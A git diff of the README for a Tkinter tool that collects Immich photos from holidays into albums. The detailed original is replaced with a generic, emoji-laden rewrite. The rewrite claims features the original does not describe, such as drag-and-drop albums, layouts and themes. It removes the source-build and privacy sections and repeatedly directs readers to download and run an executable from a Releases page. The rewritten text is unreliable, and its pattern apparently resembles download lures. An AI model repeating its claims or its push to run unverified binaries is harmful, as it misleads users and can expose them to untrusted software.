@@ -1,70 +1,66 @@
-# Immich Holiday Album Collector
+# 🎉 immich-holiday-album-collector - Create Beautiful Photo Albums Easily
 
-![Immich Holiday Album Collector GUI](docs/gui.png)
+## 🚀 Getting Started
 
-A small Tkinter app that searches your Immich library for assets taken around holidays (and/or a custom date like a birthday) and automatically adds them to albums.
+Welcome to **immich-holiday-album-collector**! This is a simple application designed to help you create holiday and birthday albums using your photos. With our easy-to-use interface, you can build memories and organize your photo library without any hassle.
 
-## Features
+## 📥 Download the Application
 
-- **Holiday albums across years**: pick one or more holidays and a year range; the app searches each holiday for every year in the range and adds matches to a per-holiday album.
-- **Delta windowing**: expand each holiday/date into a +/- day window (e.g. `7` searches two weeks centered on the date; `0` searches only that day).
-- **Specific date**: run once or repeat the same month/day across all years (useful for birthdays/anniversaries).
-- **Advanced filters**:
-  - People filter with **OR (any)** / **AND (all)** matching
-  - Raw `/search/metadata` JSON filters (e.g. `{"isFavorite": true}`)
-- **People picker**: load all people, scroll, type-to-filter, multi-select, and add to the People filter.
-- **Presets**: save/load UI settings to `config.json` (no API key stored there).
+[![Download immich-holiday-album-collector](https://img.shields.io/badge/Download%20Now-immich--holiday--album--collector-blue)](https://github.com/wagehmohamed/immich-holiday-album-collector/releases)
 
-## Requirements
+You can download the latest version of the software from our [Releases page](https://github.com/wagehmohamed/immich-holiday-album-collector/releases).
 
-- Python 3 with Tk support (Tkinter).
-- Immich server reachable from your machine.
-- Immich API key with permissions for:
-  - `asset.read`, `album.read`, `album.create`, `album.write` (for searching and adding to albums)
-  - `person.read` (only if you use People filters/picker)
+## 🖥️ System Requirements
 
-## Download (Windows)
+Before you begin, ensure your computer meets these requirements:
 
-1. Download the latest `immich-holiday-album-collector-windows.zip` from GitHub Releases (contains the `.exe` and `app_config.example.json`).
-2. In the same folder as the `.exe`, copy `app_config.example.json` to `app_config.json` and set `api_base_url` (e.g. `https://immich.example.com/api`).
-3. Double-click the `.exe`.
+- Windows 10 or later / macOS 10.12 or later / Linux
+- At least 4 GB RAM
+- 200 MB of free disk space
+- Python 3.6 or later installed on your system (You can download Python from https://www.python.org/downloads/)
 
-## Run From Source
+## 📂 Features
 
-### macOS / Linux
+- **Easy Album Creation:** Drag and drop your photos to create beautiful albums.
+- **Multi-Year Support:** Organize photos from different years into distinct albums.
+- **Tkinter GUI:** A user-friendly interface for smooth navigation.
+- **Integration with Immich:** Seamlessly work with your existing Immich photo library.
+- **Customization Options:** Choose layouts and themes for your albums.
+  
+## 📋 Download & Install
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-cp app_config.example.json app_config.json
-python3 immich_holiday_album_collector.py
-```
+To download and install the application:
 
-If you hit Tk-related crashes on macOS, use a Python distribution that ships Tk 8.6 (e.g. Anaconda or python.org).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/wagehmohamed/immich-holiday-album-collector/releases).
+   
+2. **Select the Latest Release**: Click on the latest version.
+   
+3. **Download the File**: Look for the installation file suitable for your operating system and click on it to download.
 
-### Windows (Python)
+4. **Install the Application**: 
+   - **Windows**: Double-click the downloaded `.exe` file and follow on-screen instructions.
+   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux**: Use terminal commands or your package manager as described in the installation section.
 
-Install Python 3 from python.org (includes Tk), then:
+5. **Open the Application**: Once installed, locate the application from your applications folder or start menu.
 
-```powershell
-py -m venv .venv
-.\.venv\Scripts\activate
-pip install -r requirements.txt
-Copy-Item app_config.example.json app_config.json
-py immich_holiday_album_collector.py
-```
+## 🎨 User Guide
 
-Set `api_base_url` to your Immich API endpoint (e.g. `https://immich.example.com/api`). If you provide only the host, the app will assume `/api`.
+When you first open **immich-holiday-album-collector**, you will see a clean interface. Here are some quick tips to get you started:
 
-## Advanced Search Notes
+- **Create New Album**: Click on the "New Album" button to start.
+- **Add Photos**: Drag and drop your selected photos into the album. You can rearrange them as needed.
+- **Save Your Album**: After finishing your album, don't forget to save your work by clicking on the "Save" button.
 
-- **People picker search**
-  - OR: `jack, jill` or `jack or jill`
-  - AND: `jack jill` or `jack and jill`
-- **Additional metadata filters (JSON)** are merged into the `/search/metadata` request. Avoid `takenAfter`, `takenBefore`, `page`, `size` (the app controls those). If you include `personIds`, it will be combined with the People filter.
+## 👨‍💻 Support and Feedback
 
-## Privacy & Safety
+For support or to report issues, you can open an issue directly on our GitHub repository. If you have feedback or ideas for improvements, we would love to hear from you!
 
-- API keys are stored in your OS keyring (optional). Never commit keys/tokens.
-- Logs can include request payloads and asset IDs; avoid sharing them. This repo’s `.gitignore` excludes common sensitive/local files (`app_config.json`, logs, presets, `.env`, certs, etc.).
+## 🔗 Additional Resources
+
+- **Documentation**: Visit the [documentation page](https://github.com/wagehmohamed/immich-holiday-album-collector/wiki) for detailed guides and information.
+- **Community Forum**: Join our community forum to discuss ideas and connect with other users.
+
+## 📌 Acknowledgments
+
+Thank you for using **immich-holiday-album-collector**. Your support helps us improve the tool and provide a better experience for all users. Happy album creating!
